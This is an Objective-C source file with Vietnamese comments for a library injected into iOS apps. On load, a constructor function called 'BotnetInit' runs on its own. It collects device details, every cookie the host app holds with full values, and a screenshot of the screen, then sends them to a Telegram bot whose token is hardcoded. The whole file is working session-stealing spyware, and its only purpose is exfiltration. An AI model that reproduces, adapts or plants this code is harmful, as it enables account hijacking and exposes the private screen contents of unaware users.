#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <netinet/in.h>
#import <sys/socket.h>
#import <string.h>

// ================== CẤU HÌNH ==================
// Chỉ cần token. Chat ID sẽ tự lấy từ tin nhắn mới nhất gửi cho bot.
#define BOT_TOKEN @"9014150856:AAG-eDe-oCKsxXLFu0iGlrHriWUDVyl3m7Q"
// =============================================

static NSString *g_chatID = nil;

#pragma mark - Device Info

NSString *getLocalIP(void) {
    struct ifaddrs *ifap = NULL;
    NSString *address = @"Unknown";

    if (getifaddrs(&ifap) == 0) {
        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
            if (strcmp(ifa->ifa_name, "lo0") == 0) continue;

            char *ip = inet_ntoa(((struct sockaddr_in *)ifa->ifa_addr)->sin_addr);
            if (ip) {
                address = [NSString stringWithUTF8String:ip];
                break;
            }
        }
        freeifaddrs(ifap);
    }
    return address;
}

NSString *getCarrierName(void) {
    CTTelephonyNetworkInfo *info = [[CTTelephonyNetworkInfo alloc] init];
    NSString *name = @"Unknown";

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    CTCarrier *carrier = info.subscriberCellularProvider;
    if (carrier.carrierName.length > 0) {
        name = carrier.carrierName;
    }
#pragma clang diagnostic pop

    return name;
}

#pragma mark - Cookies

NSString *getAppCookies(void) {
    NSArray *cookies = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookies];

    if (cookies.count == 0) {
        return @"No cookies found in this app";
    }

    NSMutableString *result = [NSMutableString string];
    [result appendFormat:@"Total: %lu cookies\n\n", (unsigned long)cookies.count];

    for (NSHTTPCookie *c in cookies) {
        [result appendFormat:@"Domain : %@\n", c.domain ?: @"?"];
        [result appendFormat:@"Name   : %@\n", c.name ?: @"?"];
        [result appendFormat:@"Value  : %@\n", c.value ?: @"?"];
        [result appendFormat:@"Path   : %@\n", c.path ?: @"/"];
        [result appendFormat:@"Secure : %@\n", c.isSecure ? @"YES" : @"NO"];
        [result appendFormat:@"HttpOnly: %@\n", c.isHTTPOnly ? @"YES" : @"NO"];
        [result appendFormat:@"Expires: %@\n", c.expiresDate ? [c.expiresDate description] : @"Session"];
        [result appendString:@"------------------------------\n"];
    }
    return result;
}

#pragma mark - Screenshot

UIImage *takeScreenshot(void) {
    __block UIImage *image = nil;

    void (^capture)(void) = ^{
        CGSize size = [UIScreen mainScreen].bounds.size;
        UIGraphicsBeginImageContextWithOptions(size, NO, [UIScreen mainScreen].scale);

        for (UIWindow *window in [UIApplication sharedApplication].windows) {
            if (window.isHidden || window.alpha < 0.01) continue;
            [window drawViewHierarchyInRect:window.bounds afterScreenUpdates:YES];
        }

        image = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();
    };

    if ([NSThread isMainThread]) {
        capture();
    } else {
        dispatch_sync(dispatch_get_main_queue(), capture);
    }
    return image;
}

#pragma mark - Telegram helpers

// Tự lấy chat_id từ tin nhắn mới nhất gửi cho bot
NSString *fetchLatestChatID(void) {
    NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/getUpdates?limit=5", BOT_TOKEN];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return nil;

    __block NSString *chatID = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (data && !error) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSArray *results = json[@"result"];
            if ([results isKindOfClass:[NSArray class]] && results.count > 0) {
                // Lấy tin nhắn mới nhất
                NSDictionary *last = results.lastObject;
                NSDictionary *message = last[@"message"] ?: last[@"edited_message"];
                id chat = message[@"chat"][@"id"];
                if (chat) {
                    chatID = [NSString stringWithFormat:@"%@", chat];
                }
            }
        }
        dispatch_semaphore_signal(sem);
    }] resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 8 * NSEC_PER_SEC));
    return chatID;
}

void sendText(NSString *text) {
    if (text.length == 0 || !g_chatID) return;

    NSString *encoded = [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    if (!encoded) return;

    NSString *urlStr = [NSString stringWithFormat:
        @"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@",
        BOT_TOKEN, g_chatID, encoded];

    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return;

    [[[NSURLSession sharedSession] dataTaskWithRequest:[NSURLRequest requestWithURL:url]] resume];
}

void sendPhoto(NSData *jpegData, NSString *caption) {
    if (!jpegData || jpegData.length == 0 || !g_chatID) return;

    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendPhoto", BOT_TOKEN]];
    if (!url) return;

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];

    NSMutableData *body = [NSMutableData data];

    // chat_id
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"%@\r\n", g_chatID] dataUsingEncoding:NSUTF8StringEncoding]];

    // caption
    if (caption.length > 0) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[[NSString stringWithFormat:@"%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
    }

    // photo
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:jpegData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // end
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    request.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
}

#pragma mark - Entry

__attribute__((constructor))
void BotnetInit(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            @try {
                // 1. Tự lấy chat_id
                g_chatID = fetchLatestChatID();
                if (!g_chatID) {
                    NSLog(@"[Botnet] Không tìm thấy chat_id. Hãy nhắn /start cho bot trước.");
                    return;
                }

                // 2. Thông tin máy
                NSMutableString *info = [NSMutableString stringWithFormat:
                    @"📱 DEVICE INFO\n"
                    @"Model   : %@\n"
                    @"iOS     : %@\n"
                    @"Name    : %@\n"
                    @"IP      : %@\n"
                    @"Carrier : %@\n"
                    @"Time    : %@",
                    [UIDevice currentDevice].model ?: @"?",
                    [UIDevice currentDevice].systemVersion ?: @"?",
                    [UIDevice currentDevice].name ?: @"?",
                    getLocalIP(),
                    getCarrierName(),
                    [NSDate date]
                ];

                // 3. Cookie
                [info appendFormat:@"\n\n🍪 COOKIES (this app)\n%@", getAppCookies()];

                sendText(info);

                // 4. Screenshot
                UIImage *shot = takeScreenshot();
                if (shot) {
                    NSData *jpeg = UIImageJPEGRepresentation(shot, 0.75);
                    if (jpeg) {
                        NSString *caption = [NSString stringWithFormat:@"Screenshot • %@ • %@",
                                             [UIDevice currentDevice].name,
                                             [UIDevice currentDevice].systemVersion];
                        sendPhoto(jpeg, caption);
                    }
                }

            } @catch (NSException *e) {
                NSLog(@"[Botnet] Exception: %@", e);
            }
        });
    }
}
